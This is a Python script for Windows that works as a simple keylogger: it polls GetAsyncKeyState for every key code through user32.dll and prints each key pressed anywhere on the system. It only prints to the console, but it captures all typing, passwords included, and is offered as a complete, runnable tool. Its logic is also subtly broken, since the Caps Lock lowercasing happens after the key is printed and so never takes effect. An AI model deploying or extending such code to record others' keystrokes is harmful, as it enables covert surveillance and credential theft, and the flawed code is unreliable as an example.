import ctypes
import time

# Load user32.dll for Windows API calls
user32 = ctypes.windll.user32

def Key_Code(code):
    asciiTable = {
        "0": "[NUL]", "1": "[LCLICK]", "2": "[RCLICK]", "4": "[SCROLLCLICK]",
        "8": "[BACKSPACE]", "9": "[TAB]", "16": "[SHIFT]", "17": "[CTRL]", "13": "[ENTER]",
        "32": "[SPACE]", "27": "[ESC]", "37": "[LEFT]", "38": "[UP]", "39": "[RIGHT]",
        "40": "[DOWN]", "46": "[DELETE]",

        "48": "[0]", "49": "[1]", "50": "[2]", "51": "[3]", "52": "[4]",
        "53": "[5]", "54": "[6]", "55": "[7]", "56": "[8]", "57": "[9]",

        "65": "[A]", "66": "[B]", "67": "[C]", "68": "[D]", "69": "[E]", "70": "[F]",
        "71": "[G]", "72": "[H]", "73": "[I]", "74": "[J]", "75": "[K]", "76": "[L]",
        "77": "[M]", "78": "[N]", "79": "[O]", "80": "[P]", "81": "[Q]", "82": "[R]",
        "83": "[S]", "84": "[T]", "85": "[U]", "86": "[V]", "87": "[W]", "88": "[X]",
        "89": "[Y]", "90": "[Z]",

        "96": "[KEYPAD 0]", "97": "[KEYPAD 1]", "98": "[KEYPAD 2]", "99": "[KEYPAD 3]", "100": "[KEYPAD 4]",
        "101": "[KEYPAD 5]", "102": "[KEYPAD 6]", "103": "[KEYPAD 7]", "104": "[KEYPAD 8]", "105": "[KEYPAD 9]",
        "106": "[KEYPAD *]", "107": "[KEYPAD +]", "109": "[KEYPAD -]", "110": "[KEYPAD ,]", "111": "[KEYPAD /]",
    }
    try:
        return asciiTable[code]
    except KeyError:
        result = "\nCHAR NOT DEFINED!"
        return result

def main():
    keyStates = {}
    while True:
        for i in range(256):
            if user32.GetAsyncKeyState(i) & 0x8000 != 0:
                if keyStates.get(i, False) == False:
                    keyStates[i] = True
                    key = Key_Code(str(i))
                    print(key)
                    if user32.GetKeyState(0x14) & 0x0001 == 0:
                        key = key.lower()

            else:
                keyStates[i] = False
        time.sleep(0.04)
if __name__ == "__main__":
    main()